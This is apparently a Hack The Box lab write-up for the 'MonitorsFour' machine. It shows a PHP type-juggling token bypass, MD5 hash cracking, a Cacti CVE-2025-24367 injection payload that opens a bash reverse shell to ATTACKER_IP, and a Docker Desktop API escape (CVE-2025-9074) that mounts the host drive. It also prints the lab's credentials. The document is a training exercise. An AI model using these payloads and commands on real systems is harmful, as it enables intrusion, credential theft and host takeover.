# MonitorsFour - Hack The Box Writeup

![HTB](https://img.shields.io/badge/HackTheBox-MonitorsFour-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Windows%20%2B%20Docker-blue)

## Box Info

| Property | Value |
|----------|-------|
| Name | MonitorsFour |
| OS | Windows (Docker Desktop) |
| Difficulty | Medium |
| IP | 10.10.11.98 |
| Key Techniques | PHP Type Juggling, CVE-2025-24367, CVE-2025-9074 |

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Web Enumeration](#web-enumeration)
3. [PHP Type Juggling Exploitation](#php-type-juggling-exploitation)
4. [Cacti Authentication & RCE](#cacti-authentication--rce)
5. [Docker Container Escape](#docker-container-escape)
6. [Flags](#flags)
7. [Lessons Learned](#lessons-learned)

---

## Reconnaissance

### Port Scanning

Initial nmap scan revealed only port 80 open:

```bash
nmap -sV -sC -Pn --top-ports 100 10.10.11.98
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
```

Added the hostname to `/etc/hosts`:

```bash
echo "10.10.11.98 monitorsfour.htb" | sudo tee -a /etc/hosts
```

### Technology Stack

```bash
whatweb monitorsfour.htb
```

```
http://monitorsfour.htb [200 OK] Bootstrap, Cookies[PHPSESSID],
Email[sales@monitorsfour.htb], HTTPServer[nginx], IP[10.10.11.98],
JQuery, PHP[8.3.27], Title[MonitorsFour - Networking Solutions]
```

**Key findings:**
- PHP 8.3.27
- nginx web server
- Email: `sales@monitorsfour.htb`

---

## Web Enumeration

### Virtual Host Discovery

Used ffuf to enumerate subdomains:

```bash
# Get default response size
curl -s -o /dev/null -w "%{size_download}" -H "Host: invalid.monitorsfour.htb" http://10.10.11.98
# Returns: 138

# Enumerate subdomains
ffuf -u http://10.10.11.98 -H "Host: FUZZ.monitorsfour.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 138
```

**Found:** `cacti.monitorsfour.htb`

Added to hosts file:
```bash
echo "10.10.11.98 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

### Directory Enumeration

```bash
dirsearch -u http://monitorsfour.htb -x 404
```

**Results:**
```
200    97B   http://monitorsfour.htb/.env
200   367B   http://monitorsfour.htb/contact
200     4KB  http://monitorsfour.htb/login
200    35B   http://monitorsfour.htb/user
```

### Exposed Environment File

The `.env` file contained database credentials:

```bash
curl http://monitorsfour.htb/.env
```

```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

### API Endpoint Discovery

The `/user` endpoint returned an interesting error:

```bash
curl http://monitorsfour.htb/user
```

```json
{"error":"Missing token parameter"}
```

This indicated a token-based API endpoint worth investigating.

---

## PHP Type Juggling Exploitation

### Vulnerability Discovery

PHP applications using loose comparison (`==`) for token validation are vulnerable to type juggling attacks. Testing with integer `0`:

```bash
curl "http://monitorsfour.htb/user?token=0"
```

**Result:** Full database dump!

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator"
  },
  {
    "id": 5,
    "username": "mwatson",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "token": "0e543210987654321",
    ...
  }
]
```

### Why This Works

PHP's loose comparison treats strings starting with `0e` followed by digits as scientific notation (0 × 10^n = 0). When comparing:

```php
if ($user_token == $provided_token)  // Loose comparison
```

- Token `0e543210987654321` evaluates to `0` in numeric context
- Our input `0` matches, bypassing authentication

### Hash Cracking

The passwords were MD5 hashes. Cracked using hashcat:

```bash
echo "56b32eb43e6f15395f6c46c1c9e1cd36" > hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cracked:** `admin:wonderful1` (Marcus Higgins)

---

## Cacti Authentication & RCE

### Cacti Version

Accessed `http://cacti.monitorsfour.htb/cacti/` and identified **Cacti 1.2.28**.

### Login

The admin user "Marcus Higgins" used username `marcus` on Cacti:

```
Username: marcus
Password: wonderful1
```

### CVE-2025-24367 - Authenticated RCE

Cacti 1.2.28 is vulnerable to CVE-2025-24367 - an authenticated RCE via graph template injection.

**Vulnerability:** Unsanitized newline characters in the `right_axis_label` field allow injection of rrdtool commands, which can create arbitrary PHP files in the web root.

**Exploit:**

```python
# CVE-2025-24367 exploit (simplified)
# Injects PHP code via graph template

right_axis_label = (
    f"XXX\n"
    f"create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "
    f"RRA:AVERAGE:0.5:1:1200\n"
    f"graph shell.php -s now -a CSV "
    f"DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`;?>\n"
)
```

**Execution:**

```bash
# Terminal 1: Start listener
nc -lvnp 4444

# Terminal 2: Run exploit
python3 cve_2025_24367.py -u marcus -p wonderful1 -i <ATTACKER_IP> -l 4444 -url http://cacti.monitorsfour.htb
```

**Result:** Reverse shell as `www-data`

### Shell Upgrade

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Docker Container Escape

### Container Detection

```bash
cat /proc/1/cgroup
# 0::/

ls -la /.dockerenv
# -rwxr-xr-x 1 root root 0 Nov 10 17:04 /.dockerenv
```

Confirmed running inside a Docker container.

### Database Enumeration

Connected to internal MariaDB using credentials from `.env`:

```bash
mysql -h mariadb -u monitorsdbuser -p'f37p2j8f4t0r' -e "SELECT * FROM monitorsfour_db.changelog;"
```

**Critical finding from changelog V.1.7:**

> "migrated to **Windows** and ported websites to Docker via **Docker Desktop 4.44.2**"

### CVE-2025-9074 - Docker Desktop Container Escape

Docker Desktop versions < 4.44.3 expose an unauthenticated Docker Engine API at `192.168.65.7:2375` accessible from containers.

**Verify API access:**

```bash
curl http://192.168.65.7:2375/version
```

```json
{"Version":"28.3.2","ApiVersion":"1.51",...}
```

**Exploit - Create container with host filesystem mount:**

```bash
curl -s -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["cat","/host_root/Users/Administrator/Desktop/root.txt"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}'
```

Response:
```json
{"Id":"1a75f405c6b9...","Warnings":[]}
```

**Start container and retrieve flag:**

```bash
curl -s -X POST http://192.168.65.7:2375/containers/1a75f405c6b9/start
curl -s http://192.168.65.7:2375/containers/1a75f405c6b9/logs?stdout=true
```

---

## Flags

| Flag | Hash |
|------|------|
| User | `[REDACTED]` |
| Root | `[REDACTED]` |

---

## Attack Flow Diagram

# We knew this was a windows machine from the start. Needed to break out at some point.
```
┌─────────────────────────────────────────────────────────────────┐
│                         RECONNAISSANCE                          │
├─────────────────────────────────────────────────────────────────┤
│  nmap scan → Port 80 (nginx)                                    │
│  whatweb → PHP 8.3.27                                           │
│  vhost enum → cacti.monitorsfour.htb                            │
│  dirsearch → /.env, /user API                                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                      INITIAL ACCESS                             │
├─────────────────────────────────────────────────────────────────┤
│  PHP Type Juggling (token=0) → User database dump               │
│  MD5 hash cracking → marcus:wonderful1                          │
│  Cacti login → Authenticated access                             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     FOOTHOLD (Container)                        │
├─────────────────────────────────────────────────────────────────┤
│  CVE-2025-24367 → Cacti graph template RCE                      │
│  Reverse shell → www-data in Docker container                   │
│  User flag retrieved                                            │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                   PRIVILEGE ESCALATION                          │
├─────────────────────────────────────────────────────────────────┤
│  Database enum → Discovered Windows + Docker Desktop 4.44.2     │
│  CVE-2025-9074 → Docker API container escape                    │
│  Host filesystem access → Root flag                             │
└─────────────────────────────────────────────────────────────────┘
```

---

## Lessons Learned

### 1. PHP Type Juggling
Always test authentication endpoints with type juggling payloads:
- `token=0` (integer zero)
- `token[]=1` (array)
- `{"token":true}` (boolean)

Tokens matching `0e[0-9]+` pattern are particularly vulnerable.

### 2. Version Enumeration
Application changelogs and version info are goldmines:
- Revealed Windows host + Docker Desktop version
- Enabled identification of CVE-2025-9074

### 3. Container Escape Vectors
When landing in containers, always check:
- Docker socket mount (`/var/run/docker.sock`)
- Internal Docker API (`192.168.65.7:2375` for Docker Desktop)
- Kernel exploits
- Mounted volumes with sensitive data

### 4. Password Reuse
Credentials found in one application (`wonderful1`) worked across systems. Always try discovered passwords everywhere.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| ffuf | Virtual host enumeration |
| dirsearch | Directory enumeration |
| curl | API testing & exploitation |
| hashcat | Password cracking |
| netcat | Reverse shell listener |
| mysql | Database enumeration |

---

## References

- [CVE-2025-24367 - Cacti Graph Template RCE](https://github.com/Cacti/cacti/security/advisories/GHSA-fh3x-69rr-qqpp)
- [CVE-2025-9074 - Docker Desktop Container Escape](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)
- [PHP Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
- [Docker Desktop Security Announcements](https://docs.docker.com/security/security-announcements/)

---

*Writeup by [Your Name] | [Date]*
